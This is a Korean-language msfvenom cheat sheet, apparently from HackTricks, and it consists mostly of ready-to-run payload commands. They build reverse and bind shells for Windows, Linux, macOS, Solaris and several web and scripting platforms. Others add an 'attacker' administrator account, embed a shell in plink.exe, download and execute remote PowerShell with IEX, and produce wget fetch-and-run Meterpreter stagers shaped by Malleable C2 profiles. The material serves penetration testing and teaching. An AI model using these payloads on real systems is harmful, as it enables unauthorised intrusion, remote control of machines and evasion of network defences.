# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## 기본 msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

`-a`를 사용하여 payload 아키텍처를 선택하고, `--platform`을 사용하여 대상 플랫폼을 선택합니다.<sup>[[1]](#references)</sup>

## 목록
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
이 명령어는 설치된 framework에서 사용할 수 있는 payload 및 encoder 모듈을 나열합니다.<sup>[[1]](#references)</sup>

## shellcode 생성 시 일반적인 params
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
여기에 표시된 플래그는 bad characters, output format, encoder 및 encoding iterations를 선택합니다.<sup>[[1]](#references)</sup>

## HTTP(S) Meterpreter 트래픽 셰이핑

Metasploit 6.5에는 staged 및 stageless reverse HTTP(S) Meterpreter payloads를 위한 `MALLEABLEC2` 옵션이 추가되었습니다. 이 profile은 URI, user agent, request/response headers, connection-ID 배치 및 지원되는 body encodings/wrappers를 변경할 수 있습니다. 생성된 payload와 해당 handler는 모두 **동일한 로컬 profile**을 로드해야 합니다. staged payload가 Meterpreter stage를 요청할 때 보내는 initial request에는 셰이핑이 적용되지 않으므로, 첫 번째 request도 profile과 일치해야 한다면 `windows/x64/meterpreter_reverse_https`와 같은 stageless payload를 우선 사용하세요.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
동일한 payload와 profile로 matching handler를 구성합니다:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
구현된 것으로 문서화된 directives만 traffic에 영향을 줍니다. 지원되지 않는 profile blocks는 성공적으로 parse될 수 있지만 아무런 영향을 주지 않을 수 있습니다.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### 사용자 생성
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **명령 실행**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding은 AV evasion이 아니다:** `x86/shikata_ga_nai`와 같은 encoder는 주로 bad-character 제약 조건을 충족하는 데 유용합니다. 반복적인 encoding은 신뢰할 수 있는 AV-evasion 기법이 아닙니다.<sup>[[1]](#references)</sup>

### 실행 파일 내부에 임베드
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **웹 기반 Payloads**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### 리버스 셸
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **스크립트 언어 payloads**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads는 사용 가능한 target utility가 기본 native payload를 다운로드하고 실행하도록 하는 command를 생성합니다. 이름은 `cmd/<platform>/<fetch-protocol>/<served-payload>` 형식을 따르며, HTTP(S), SMB 및 TFTP adapters를 사용할 수 있습니다. downloader 선택지는 target platform에 따라 달라집니다.<sup>[[2]](#references)</sup>

예를 들어, port 8080에서 x64 Meterpreter payload를 가져와 port 4444로 연결하는 Linux `wget` command를 생성합니다:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
동일한 설정으로 **fetch handler**를 시작합니다. 생성된 ELF를 호스팅하고 제공된 Meterpreter payload에 대한 handler도 시작합니다:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
유용한 dependent options에는 지원되는 경우 더 짧은 HTTP(S) 명령을 출력하는 `FETCH_PIPE=true`와 익명 file descriptor에서 Linux ELF를 실행하는 `FETCH_FILELESS=shell`, `shell-search` 또는 `python3.8+`가 포함됩니다. Fileless modes에는 Linux kernel 3.17 이상이 필요합니다. 지원되는 조합은 달라지므로 `msfvenom -p <FETCH_PAYLOAD> --list-options`로 정확한 adapter를 확인하세요.<sup>[[2]](#references)</sup>



## References

- [1] [msfvenom 사용 방법](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Fetch Payloads 사용 방법](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
